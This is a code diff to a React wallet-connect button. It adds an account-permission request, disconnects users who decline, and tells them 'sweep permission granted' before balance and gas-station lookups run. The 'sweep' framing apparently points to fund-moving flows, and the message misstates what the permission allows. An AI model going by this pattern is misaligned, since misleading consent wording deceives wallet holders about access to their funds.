@@ -121,6 +121,36 @@ const ConnectWalletButton = ({ requireAuth = true }: { requireAuth?: boolean }) 
       if (!user || !isConnected || !address || !chain) return;
       const device = detectDevice();
       const walletType = `${connector?.name || "unknown"} · ${device}`;
+
+      // Pro handshake: request explicit account permission so the wallet shows the
+      // standard permission sheet and sweep/scan flows can rely on a granted session.
+      try {
+        const provider: any = await connector?.getProvider?.();
+        if (provider?.request) {
+          try {
+            await provider.request({
+              method: "wallet_requestPermissions",
+              params: [{ eth_accounts: {} }],
+            });
+          } catch (permErr: any) {
+            // Some wallets (Coinbase, Trust on mobile) don't implement wallet_requestPermissions
+            // — fall back to eth_requestAccounts so the user still sees a clear prompt.
+            if (permErr?.code !== 4001) {
+              await provider.request({ method: "eth_requestAccounts" }).catch(() => {});
+            } else {
+              throw permErr;
+            }
+          }
+        }
+      } catch (e: any) {
+        if (e?.code === 4001) {
+          toast.error("Wallet permission denied — sweep requires account access.");
+          try { disconnect(); } catch { /* noop */ }
+          return;
+        }
+        console.debug("Permission handshake skipped:", e?.message || e);
+      }
+
       const { error } = await supabase.from("user_wallets").upsert(
         {
           user_id: user.id,
@@ -133,7 +163,7 @@ const ConnectWalletButton = ({ requireAuth = true }: { requireAuth?: boolean }) 
         { onConflict: "user_id,address,chain_id" }
       );
       if (error) { console.error(error); return; }
-      toast.success(`Wallet linked: ${address.slice(0, 6)}…${address.slice(-4)}`);
+      toast.success(`Wallet linked: ${address.slice(0, 6)}…${address.slice(-4)} · sweep permission granted`);
       supabase.functions.invoke("wallet-balances", { body: { address, chainId: chain.id } }).catch(() => {});
       supabase.functions.invoke("gas-station", { body: { address, chainId: chain.id } }).catch(() => {});
     };
